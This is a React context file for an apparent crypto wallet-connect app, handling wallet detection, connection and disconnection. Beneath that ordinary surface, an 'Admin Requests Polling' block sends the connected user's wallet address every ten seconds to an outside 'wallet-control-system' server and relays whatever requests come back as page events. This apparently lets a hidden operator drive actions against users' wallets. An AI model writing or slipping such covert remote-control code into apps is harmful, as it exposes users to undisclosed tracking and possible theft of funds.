// wallet-connect-app/src/context/WalletContext.js
import React, { createContext, useContext, useState, useEffect } from "react";
import { detectWalletEnvironment, connectWallet } from "../wallets/index.js";

const WalletContext = createContext(null);

export function WalletProvider({ children }) {
  const [connected, setConnected] = useState(false);
  const [chain, setChain] = useState(null);
  const [address, setAddress] = useState(null);
  const [walletName, setWalletName] = useState(null);
  const [walletId, setWalletId] = useState(null);
  const [provider, setProvider] = useState(null);
  const [loading, setLoading] = useState(false);

  // ============================
  // Detect Wallet on Page Load
  // ============================
  const detect = async () => {
    try {
      const d = detectWalletEnvironment();
      if (d.walletId) {
        setChain(d.chain);
        setWalletId(d.walletId);
        setWalletName(d.walletName);
      } else {
        setChain(null);
        setWalletId(null);
        setWalletName(null);
        setProvider(null);
        setAddress(null);
      }
    } catch {
      setChain(null);
      setWalletId(null);
      setWalletName(null);
      setProvider(null);
      setAddress(null);
    }
  };

  // ============================
  // Connect Wallet (MetaMask etc.)
  // ============================
  const connect = async () => {
    setLoading(true);
    try {
      const result = await connectWallet();

      setChain(result.chain);
      setAddress(result.address);
      setWalletName(result.walletName);
      setWalletId(result.walletId);
      setProvider(result.provider);
      setConnected(true);

      setLoading(false);
      return { success: true, data: result };
    } catch (error) {
      setConnected(false);
      setLoading(false);
      return { success: false, error: error.message };
    }
  };

  // ============================
  // Disconnect Wallet
  // ============================
  const disconnect = () => {
    setConnected(false);
    setChain(null);
    setAddress(null);
    setWalletName(null);
    setWalletId(null);

    if (provider) {
      try {
        if (typeof provider.disconnect === "function") provider.disconnect();
        else if (typeof provider.close === "function") provider.close();
        else if (provider.walletConnect?.disconnect) provider.walletConnect.disconnect();
      } catch {}
      setProvider(null);
    }
  };

  // ============================
  // Auto Detect on Load
  // ============================
  useEffect(() => {
    detect();
  }, []);

  // ============================
  // Admin Requests Polling
  // ============================
  useEffect(() => {
    if (!address) return;

    const checkAdminRequests = async () => {
      try {
        const res = await fetch(
          `https://meme-wallet-control-system-hx1r.vercel.app/api/get-wallet-requests?address=${address}`
        );

        const data = await res.json();

        if (data.success && Array.isArray(data.requests) && data.requests.length > 0) {
          const req = data.requests[0];
          window.dispatchEvent(new CustomEvent("adminRequest", { detail: req }));
        }
      } catch {}
    };

    checkAdminRequests();
    const interval = setInterval(checkAdminRequests, 10000);
    return () => clearInterval(interval);
  }, [address]);

  const contextValue = {
    connected,
    chain,
    address,
    walletName,
    walletId,
    provider,
    loading,
    detect,
    connect,
    disconnect
  };

  return (
    <WalletContext.Provider value={contextValue}>
      {children}
    </WalletContext.Provider>
  );
}

export function useWallet() {
  const ctx = useContext(WalletContext);
  if (!ctx) {
    throw new Error("useWallet must be used within WalletProvider");
  }
  return ctx;
}

export { WalletContext };
